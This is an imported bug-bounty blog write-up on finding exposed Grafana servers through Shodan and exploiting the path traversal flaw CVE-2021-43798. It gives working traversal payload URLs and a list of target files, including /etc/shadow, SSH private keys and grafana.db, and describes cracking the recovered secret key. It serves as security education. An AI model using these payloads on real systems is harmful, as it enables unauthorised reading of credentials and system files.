---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-11_from-shodan-dork-to-grafana-local-file-inclusion.md
original_filename: 2022-11-11_from-shodan-dork-to-grafana-local-file-inclusion.md
title: From Shodan Dork to Grafana 📊Local File Inclusion
category: documents
detected_topics:
- command-injection
- path-traversal
- automation-abuse
- information-disclosure
- cloud-security
tags:
- imported
- documents
- command-injection
- path-traversal
- automation-abuse
- information-disclosure
- cloud-security
language: en
raw_sha256: 5dd04c33289e14dbedc2d217179711af7700344dfa6082c33bb86ff4fb71dd97
text_sha256: ce948480d9a65223073b94cadcc1d39616b7b43843d2a21917756c5e6d7b8b0a
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# From Shodan Dork to Grafana 📊Local File Inclusion

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-11_from-shodan-dork-to-grafana-local-file-inclusion.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, automation-abuse, information-disclosure, cloud-security
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `5dd04c33289e14dbedc2d217179711af7700344dfa6082c33bb86ff4fb71dd97`
- Text SHA256: `ce948480d9a65223073b94cadcc1d39616b7b43843d2a21917756c5e6d7b8b0a`


## Content

---
title: "From Shodan Dork to Grafana 📊Local File Inclusion"
url: "https://varmaanu001.medium.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264"
authors: ["Anurag__Verma"]
bugs: ["LFI", "Old components with known vulnerabilities"]
publication_date: "2022-11-11"
added_date: "2022-11-11"
source: "pentester.land/writeups.json"
original_index: 1925
scraped_via: "browseros"
---

# From Shodan Dork to Grafana 📊Local File Inclusion

From Shodan Dork to Grafana 📊Local File Inclusion
Anurag__Verma
Follow
4 min read
·
Nov 11, 2022

304

2

Hi readers 📖, This is my new article on local file inclusion I found using shodan recon and further exploiting grafana service.

In the end, I will also provide a video POC link from my youtube channel, which will help you to understand this more clearly.

let's get started,

for the grafana-related services I used simple shodan dork

“title:grafana hostname:target” you can also use http.title:grafana

as a result, I got one grafana service running on the target IP.

Press enter or click to view image in full size

you can further use ipinfo.io to gather more information related to IP addresses.

Now the grafana was running on port 3000 which is common for this service, as usual, I check for default credentials but they don’t work for me.

Press enter or click to view image in full size

further, I found the service was running on version v8.0.4, then I looked up available CVEs for the version and I found the version is vulnerable to LFI vulnerability.

you can check the version in the bottom details in below sample screenshot it is 9.2.3, but in my case, the version was 8.0.4.

Press enter or click to view image in full size

NOTE: LFI vulnerability affects Grafana 8.0.0-beta1 to 8.3.0

a little intro to LFI:

An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross Site Scripting. Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.

So, let's come to the topic,

now it was vulnerable to CVE-2021–43798 you can read/check details related to this CVE at https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798 .

manually , I found LFI at the path /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd on plugin alert list

then the full path becomes /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/

payload: http://target_ip:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/

Get Anurag__Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

result:

Press enter or click to view image in full size

but there can be a lot of plugins such as

alertlist
annolist
grafana-azure-monitor-datasource
barchart
bargauge
cloudwatch
dashlist
elasticsearch
gauge
geomap
gettingstarted
stackdriver
graph
graphite
heatmap
histogram

and more……….

plus there can be more paths other than /etc/passwd we may miss other sensitive information if somehow /etc/passwd doesn’t work

for example:

/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini
/..%2f..%2f..%2f..%2f..%2fconf/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/defaults.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/.ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.bash_history
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.ssh/id_rsa
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fusr/local/etc/grafana/grafana.ini
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/fib_trie
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/tcp
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline

So manually, finding each case with the respective plugin is a lengthy process so you can make your own script to automate the task,

Further to automate the attack I used a tool made specifically for this CVE on GitHub https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798

as I already said we can find more sensitive information on another path as well as found in the defaults.ini path, further I was able to crack credentials with the help of the above-mentioned tool, alternatively, you can use other tools to crack the key like hashcat or john the ripper.

Press enter or click to view image in full size
Press enter or click to view image in full size

cracking the secret key

Press enter or click to view image in full size

This way the vulnerability impact increases.

I am adding video proof of concept below :

Thanks for reading the article 🤩

Subscribe to my youtube channel for bug-hunting-related stuff: redirect _poc

You can follow me on Instagram at varmaanu001

follow me on Linkedin: my_linkedin

From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. Join our weekly newsletter to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!
